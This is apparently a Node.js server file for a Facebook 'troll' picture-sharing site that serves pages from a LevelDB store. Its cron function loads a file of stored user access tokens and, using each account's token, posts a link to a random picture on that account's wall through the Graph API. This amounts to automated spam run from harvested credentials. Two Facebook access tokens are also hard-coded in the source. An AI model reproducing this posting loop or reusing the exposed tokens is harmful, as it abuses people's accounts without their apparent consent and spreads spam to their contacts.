var bind = require('bind');
var get = require('get');
var fs = require('fs');
var level = require('level-rocksdb');
var db = level('/db/mydb');
var request = require('request');  


function cron() {
	var token = "CAAAAHJBZCQF8BAL5dJpLjEd7xNxdyhAUfBPoDcJYk1dM2qoZBKRyRAuxTS9nxKMmphGBp3RzTixazxCET3q1pGTCiMtN9QtHvSdvFKxKSOccMNVsIrrTjxNjRa4Kn8bLLpDRd4muzCyJMIq9UMqEidg2pouBZBFM2T5vCZAZA9YVA0QM7ZAdTv";
	fs.readFile("/root/accounts.txt", "utf8", function(err, data2) {
		if (!err) {
			var dataz = JSON.parse(data2).data;
			var randomnumber = Math.floor(Math.random() * 10000);
			get('https://arpecop.net/quotepublisher/db/hlikesphoto').asString(function(err, data2) {
				var getstack = Math.round(Math.round(JSON.parse(data2).total) / 10 - 1);

				get('http://arpecop.net/quotepublisher/db/hlikesphoto' + getstack).asString(function(err, data1) {
					if (!err && data1 && data1.length > 200) {

						var randomnumber = Math.floor(Math.random() * JSON.parse(data1).items.length);
						var text = JSON.parse(JSON.parse(data1).items[randomnumber].data);

						db.put(text.id, JSON.stringify(text), function() {
							dataz.reverse().forEach(function(val, index) {
								//	if (val.name == "Cancer") {
								request.post("https://graph.facebook.com/" + val.id + "/links", {
									form: {
										access_token: val.access_token,
										link: 'http://rofl.sytes.net/troll/spodeli/' + text.id
									}
								}, function(err, data) {
									console.log(data.body);

								});

								//	};
							})

						})



					}

				});
			});
		}
	});
}



exports.spodelime = function(req, response) {
	var gvar = {};
	var id = req.params.id;
	gvar.ogurl = 'http://' + req.headers.host + '/troll/spodeli/' + id;
	gvar.id = id;
	gvar.ilike = "Сподели";
	db.get(id, function(err, data1) {
		var data = JSON.parse(data1);

		gvar.title = data.caption;
		gvar.imgsrc = data.picture.replace('_s', '_n');

		bind.toFile('/usr/share/nginx/html/troll/design.html', gvar, function callback(data) {
			response.writeHead(200, {
				'Content-Type': 'text/html'
			});
			response.end(data);
		});
	})
}


exports.cron = function(req, res) {
	cron();
	res.end('ok');

};

exports.troll1 = function(req, response) {


	var host = req.headers.host;


	var gvar = {};

	gvar.next = req.query["id"];
	if (!gvar.next) {
		gvar.next = "0";
	}

	gvar.home = "Pic";
	gvar.ilike = "Share";
	gvar.home = "Pic";
	gvar.ilikes = "Likes";
	gvar.more = "More Fun";
 
var id = req.params.id;
gvar.id = id;
if (id.length > 13) {
	if (req.method == "POST") {
		gvar.hide = '#header';
		gvar.overflow = 'hidden';
		gvar.resize = 'FB.Canvas.setAutoGrow();'
		gvar.ogurl = 'https://apps.facebook.com/like-wall/' + id;
	} else {
		var host = req.headers.host;
		gvar.host = host;
		gvar.hide = '.something';
		gvar.overflow = 'block';
		gvar.ogurl = 'http://' + host + '/troll/' + id;
	}



	var real_id = encodeURIComponent(id);
	gvar.imgsrc = 'https://graph.facebook.com/' + id + '/picture?access_token=CAAAAHJBZCQF8BAGiBl6epy8QIhA2GMKTKelR2xNkli4aNqjMWPnKmMho4k1hZCpvLzkcDS9tcF4i0FL6O7CZB1wTvScR8Qh2aTXfiJRW2Rcv5ifdrCTRLabhy4tLLxqLNx0fTleotZBiZCESubZBXlQFPQi5Of6lmNmcp3sEYc74CT0q9XqaXZB';
	db.get(id, function(err, bodyx) {

		if (!err) {
			var body = JSON.parse(bodyx);

			var chrand = Math.floor(Math.random() * 5654);
			var chrand1 = Math.floor(Math.random() * 70);
			var arrx = [];
			var arry = [];
			var i = 0;
			db.get('trollchunk1-' + chrand, function(err, bodyx) {
				if (!err && bodyx.length > 100) {
					gvar.links1x = bodyx.split(",");
					var lengther = gvar.links1x.length - 1;
					gvar.links1x.forEach(function(val, index) {
						db.get(val, function(err, bodyxx) {
							if (!err) {
								var jsoned = JSON.parse(bodyxx);
								if (jsoned.source) {
									var imgsmall = jsoned.source.replace('_n', '_s');

									jsoned.titleto = "";
									if (jsoned.comments) {

										jsoned.titleto = jsoned.comments[0].message;
									}
									arrx.push('<li class="' + jsoned.id + '"><a href="#' + jsoned.id + '"> - ' + jsoned.titleto + '</a></li>');
									arry.push('<div id="' + jsoned.id + '" class="item" title="' + jsoned.titleto + '" alt="' + jsoned.source + '"><a href="http://rofl.sytes.net/troll/' + jsoned.id + '">' + jsoned.titleto + '</a><br><img src="http://rofl.sytes.net/troll/src/loading.gif"></div>');
								};
								i++;
							}
							if (index == lengther) {
								gvar.links1 = arrx.join('');
								gvar.links2 = arry.join('');
								if (body.comments) {
									gvar.commentz = body.comments;
									gvar.name = body.comments[0].message;
								}
								gvar.source = body.source;
								bind.toFile('/usr/share/nginx/html/troll/design.html', gvar, function callback(data) {
									response.writeHead(200, {
										'Content-Type': 'text/html'
									});
									response.end(data);
								});
							}
						});
					});

				} else {


				}

			});



		} else {

			bind.toFile('/usr/share/nginx/html/troll/design.html', gvar, function callback(data) {
				response.writeHead(200, {
					'Content-Type': 'text/html'
				});
				response.end(data);
			});


		}
	});


} else {
	response.end('index');
}
};